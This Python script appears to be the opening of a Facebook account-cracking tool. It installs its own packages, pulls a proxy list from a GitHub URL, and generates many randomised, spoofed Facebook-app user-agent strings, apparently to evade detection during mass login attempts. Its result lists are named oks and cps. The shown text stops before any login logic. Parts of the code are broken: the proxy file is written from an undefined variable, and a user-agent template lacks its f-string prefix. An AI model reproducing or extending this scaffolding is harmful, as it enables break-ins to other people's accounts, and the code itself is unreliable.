#SABBIR-KHAN

#--------------------------(IMPORT BOX)--------------------------#
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
    
import os
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')
except:pass
#-----------------proxy
try:
	prox= requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/proxies.txt').text
	open('proxies.txt','w').write(proxies)
except Exception as e:
	print('\x1b[1;92m[√] LOADING...')
proxies=open('proxies.txt','r').read().splitlines()


#__________________[ COLOUR ]__________________#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;48m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
a='\x1b[38;5;118m';b='\x1b[38;5;119m';c='\x1b[38;5;120m';d='\x1b[38;5;121m';e='\x1b[38;5;122m';g='\x1b[38;5;46m';r='\x1b[38;5;196m';w='\033[1;37m'

#--------------------------(COLOUR BOX)--------------------------#    
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
#--------------------------(COUNT BOX)--------------------------#
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
ugen=[]
uas=[]
hex=[]
usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
def murad_xd():
	fb=str(random.choice(range(121,987)))
	vrs=str(random.randint(6,14))
	c=str(random.randint(111,999))
	r=str(random.randint(2134,9876))
	m=str(random.randint(111,999))
	zte=str(random.choice(["ASUS_Z01QD","ASUS_I005DC","NX55","MXB48T","ASUS_Z016D","ASUS_Z00AD","ASUS_X00TD","ASUS_X01BDA","ASUS_X00TDB"]))
	moto=str(random.choice(["XT1021","MotoE2","XT1710-02"]))
	rdmi=str(random.choice(["MI 8 Lite","Redmi Note 9 Pro","Redmi Note 8T","Redmi Note 7","Redmi 6","Redmi 7A","Redmi 4X","M2003J15SC","Redmi 4","MI 9","Redmi 5A","Mi 10","Mi A2 Lite","MI 8 Lite","M2003J15SC","Redmi Note 8","Redmi 4X","Mi Note 10 Lite","Redmi 8","Redmi 6","M2004J19C","M2010J19SY","Redmi 3X","M2103K19G","Redmi Note 8T","Redmi Note 7","Redmi Note 8T","Redmi 4X","Redmi 3X","MI 5X","Redmi Note 8 Pro","Redmi Note 8","Redmi Note 4","M2006C3MNG"]))
	hu=str(random.choice(['Huawei P8 Lite (2017)','DUB-LX1','AGS2-L09','POT-LX1','DRA-LX2','POT-LX3','VOG-L29','EVR-N29','FIG-LX1','Kirin Treble','HUAWEI LUA-L21','ATU-L31','COL-L29','NAM-LX9','VOG-L29','JKM-LX1','RNE-L22','ALE-L21','HUAWEI CUN-L21','PRA-LX1','HUAWEI CUN-L01','HUAWEI TAG-L21','WAS-LX1A','EVA-L09','ALE-L21','VTR-L09','EVA-L09','ALE-L21','CAM-L21','RNE-L21','HUAWEI VNS-L31','WAS-LX1A','PRA-LX1','HUAWEI ATH-UL01','LLD-L31','CLT-L09','VIE-L09','FIG-LX1','SNE-LX2','VTR-L09','PAR-LX1','MAR-LX1A']))
	tcl=str(random.choice(["4013X","8079","5056N","5022D","5056D","5054X","6055K","6045Y","8050E","Alcatel_4060A","9006W","A501DL","Alcatel_5008R","9137W","9137W","5032W","5034D_RU","REVVL 2"]))
	opp=str(random.choice(["F1w","OPPO A5(2020)","1201","A37f","oppo r7sm","F1w Build","A1","A1 Pro","A11","A11k","A11x","A12","A15","A15s","A16","A16e","A16k","A16s","A17","A17k","A18","A1k","A1s","A25","A3","C25","C25s","C25Y","C3","C30","C30s","C31","C33","C35","C51","C53","C55","Narzo 20","Narzo 20 Pro","Narzo 20A","Narzo 30","Narzo 30 5G","Narzo 30A","Narzo 50","Narzo 50 5G","Narzo 50 Pro","Narzo 50 Pro 5G","Narzo 50A","Narzo 50A Prime","Narzo 50i","Narzo 50i Prime","Pad","Pad Mini","Pad X","Q2 5G","Q2 Pro","Q3 5G","Q3 Pro 5G","Q3 Pro Play","Q3s","Q3t","Q5","Q5 Pro","Q5i","U1","V11 5G","V11s 5G","V13 5G","V15 5G","V20","V23","V25","V3 5G","V30","V5 5G","X","X2","X2 Dual","X2 Pro","X3","X3 Super Zoom","X50 5G","X50 Pro","X50 Pro 5G","X50 Pro Player","X50t 5G","X7 5G","X7 Pro 5G","X7 Pro Extreme Edition","XT","A30","A31","A31c","A32","A33","A33m","A33t","A34","A35","A36","A37","A37t","A38","A39","A3s","A4","A40","A400","A41","A42","A43","A44","A45","A46","A47","A48","A49","A5","A5 (2020)","A50","A51","A52","A53","A53 5G","A53m","A53","A53s 5G","A54","A54 5G","A54s","A55","A55 5G","A55s 5G","A56","A56 5G","A57","A57 (2016)","A57 (2022)","A58","A58 5G","A59","A59m","A59s","A59t","A5S","A7","A71","A71 (2018)","A71A","A72","A72n 5G","A73","A73 5G","A73t","A74","A74 5G","A76","A77","A77 5G","A77s","A77t","A78","A78 5G","A79","A79k","A79t","A7n","A7x","A8","A83","A83 (2018)","A83PRO","A83t","A85T","A9","A9 (2020)","A91","A92","A92s","A93","A93s","A94","A95","A96","A96 5G","A97","A98","A98 5G","A9x","AX5","AX5s","AX7","C1","CNM632","CPH1114","CPH1235","CPH1451","CPH1615","CPH1664","CPH1869","CPH1929","CPH1985","CPH2048","CPH2068","CPH2107","CPH2238","CPH2261","CPH2331","CPH2332","CPH2351","CPH2381","CH2389","CPH2399","CPH2401","CPH2409","CPH2411","CPH2413","CPH2415","CPH2417","CPH2419","CPH2423","CPH2447"]))
	sm=str(random.choice(['SM-J200F','SM-G920F','NRD90M', 'SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H']))
	a="Mozilla/5.0 (Linux; Android "+vrs+"; "+opp+" Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/"+fb+".0.0.10."+fb+";]"	 
	b="Mozilla/5.0 (Linux; Android "+vrs+"; "+sm+" Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FBAN/FB4A;FBAV/"+fb+".0.0.38."+fb+";FBBV/584018577;FBDM/{density=2.625,width=1080,height=2069};FBLC/en_US;FBRV/0;FB_FW/2;FBCR/DIGICEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/"+sm+";FBSV/12;FBOP/19;FBCA/arm64-v8a:;]"
	c="Mozilla/5.0 (Linux; Android "+vrs+"; "+sm+" Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.38."+fb+";]"	 
	d="Mozilla/5.0 (Linux; Android "+vrs+"; "+sm+" Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.50."+fb+";]"	 
	e="Mozilla/5.0 (Linux; Android "+vrs+"; "+sm+" Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.26."+fb+";]"	 
	f="Mozilla/5.0 (Linux; Android "+vrs+"; 23021RAA2Y Build/TKQ1.221114.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.43."+fb+";]"	 
	g="Mozilla/5.0 (Linux; Android "+vrs+"; "+opp+" Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/"+fb+".0.0.16."+fb+";]"	 
	h="Mozilla/5.0 (Linux; Android "+vrs+"; "+hu+" Build/HUAWEIDCO-L29; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.30."+fb+";]"	 
	i="Mozilla/5.0 (Linux; Android "+vrs+"; "+tcl+" Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.32."+fb+";]"	 
	j="Mozilla/5.0 (Linux; Android "+vrs+"; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.23."+fb+";]"	 
	k="Mozilla/5.0 (Linux; Android "+vrs+"; RMX3115 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.32."+fb+";]"	 
	l="Mozilla/5.0 (Linux; Android "+vrs+"; "+opp+" Build/SKQ1.220617.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.33."+fb+";]"	 
	m="Mozilla/5.0 (Linux; Android "+vrs+"; "+opp+" Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.29."+fb+";]"	 
	n="Mozilla/5.0 (Linux; Android "+vrs+"; KKG-AN00 Build/HONORKKG-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.35."+fb+";]"
	o="Mozilla/5.0 (Linux; Android "+vrs+"; RMX3686 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.37."+fb+";]"
	p="Mozilla/5.0 (Linux; Android "+vrs+"; "+opp+" Build/SKQ1.211209.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.34."+fb+";]"
	q="Mozilla/5.0 (Linux; Android "+vrs+"; RMX2111 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.23."+fb+";]"
	r="Mozilla/5.0 (Linux; Android "+vrs+"; "+sm+" Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.22."+fb+";]"
	s="Mozilla/5.0 (Linux; Android "+vrs+"; "+opp+" Build/TP1A.220624.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.33."+fb+";]"
	t="Mozilla/5.0 (Linux; Android "+vrs+"; "+sm+" Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0.."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.33."+fb+";]"
	u="Mozilla/5.0 (Linux; Android "+vrs+"; "+rdmi+" Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.44."+fb+";]"
	v="Mozilla/5.0 (Linux; Android "+vrs+"; "+rdmi+" Build/UKQ1.231003.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".1.0.49."+fb+";]"
	w="Mozilla/5.0 (Linux; Android "+vrs+"; "+sm+" Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.44."+fb+";]"
	x="Mozilla/5.0 (Linux; Android "+vrs+"; "+sm+" Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".1.0.49."+fb+";]"	 
	y="Mozilla/5.0 (Linux; Android "+vrs+"; "+rdmi+" Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.45."+fb+";]"	 
	z="Mozilla/5.0 (Linux; Android "+vrs+"; "+rdmi+" Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".1.0.49."+fb+";]"	 
	aa="Mozilla/5.0 (Linux; Android "+vrs+"; "+sm+" Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".1.0.49."+fb+";]"	 
	bb="Mozilla/5.0 (Linux; Android "+vrs+"; "+rdmi+" Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".1.0.49."+fb+";]"	 
	cc="Mozilla/5.0 (Linux; Android "+vrs+"; HD1913 Build/SKQ1.211113.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".1.0.49."+fb+";]"	 
	dd="Mozilla/5.0 (Linux; Android "+vrs+"; "+opp+" Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".1.0.49."+fb+";]"	 
	ee="Mozilla/5.0 (Linux; Android "+vrs+"; "+rdmi+" Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".1.0.49."+fb+";]"	 
	ff="Mozilla/5.0 (Linux; Android "+vrs+"; "+rdmi+" Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.40."+fb+";]"	 
	gg="Mozilla/5.0 (Linux; Android "+vrs+"; "+rdmi+" Build/RKQ1.210503.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".1.0.49."+fb+";]"	 
	hh="Mozilla/5.0 (Linux; Android "+vrs+"; "+sm+" Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".1.0.49."+fb+";]"	 
	ii="Mozilla/5.0 (Linux; Android "+vrs+"; "+rdmi+" Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.40."+fb+";]"	 
	jj="Mozilla/5.0 (Linux; Android "+vrs+"; "+rdmi+" Build/QKQ1.200419.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.44."+fb+";]"	 
	kk="Mozilla/5.0 (Linux; Android "+vrs+"; "+opp+" Build/QKQ1.200209.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.40."+fb+";]"	 
	ll="Mozilla/5.0 (Linux; Android "+vrs+"; "+sm+" Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.40."+fb+";]"	 
	mm="Mozilla/5.0 (Linux; Android "+vrs+"; "+rdmi+" Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.45."+fb+";]"	 
	nn="Mozilla/5.0 (Linux; Android "+vrs+"; "+hu+" Build/HUAWEIATU-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".1.0.49."+fb+";]"	 
	oo="Mozilla/5.0 (Linux; Android "+vrs+"; "+rdmi+" Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.44."+fb+";]"	 
	pp="Mozilla/5.0 (Linux; Android "+vrs+"; "+zte+" Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.44."+fb+";]"	 
	qq="Mozilla/5.0 (Linux; Android "+vrs+"; "+sm+" Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.40."+fb+";]"	 
	rr="Mozilla/5.0 (Linux; Android "+vrs+"; "+moto+" Build/THAS33.31-40-1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.40."+fb+";]"	 
	ss="Mozilla/5.0 (Linux; Android "+vrs+"; "+sm+" Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.44."+fb+";]"	 
	tt="Mozilla/5.0 (Linux; Android "+vrs+"; "+sm+" Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.40."+fb+";]"	 
	uu="Mozilla/5.0 (Linux; Android "+vrs+"; "+rdmi+" Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.45."+fb+";]"	 
	vv="Mozilla/5.0 (Linux; Android "+vrs+"; "+rdmi+" Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.30."+fb+";]"	 
	ww="Mozilla/5.0 (Linux; Android "+vrs+"; "+sm+" Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.30."+fb+";]"	 
	xx="Mozilla/5.0 (Linux; Android "+vrs+"; "+rdmi+" Build/TKQ1.221114.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.30."+fb+";]"	 
	yy="Mozilla/5.0 (Linux; Android "+vrs+"; "+sm+" Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.30."+fb+";]"	 
	zz="Mozilla/5.0 (Linux; Android "+vrs+"; "+sm+" Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.30."+fb+";]"	 
	a1="Mozilla/5.0 (Linux; Android "+vrs+"; "+rdmi+" Build/TKQ1.221013.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+". Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.25."+fb+";]"	 
	b1="Mozilla/5.0 (Linux; Android "+vrs+"; "+sm+" Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.30."+fb+";]"	 
	c1="Mozilla/5.0 (Linux; Android "+vrs+"; "+rdmi+" Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.25."+fb+";]"	 
	d1="Mozilla/5.0 (Linux; Android "+vrs+"; "+sm+" Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/"+c+".0."+r+"."+m+" Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/"+fb+".0.0.29."+fb+";]"	 
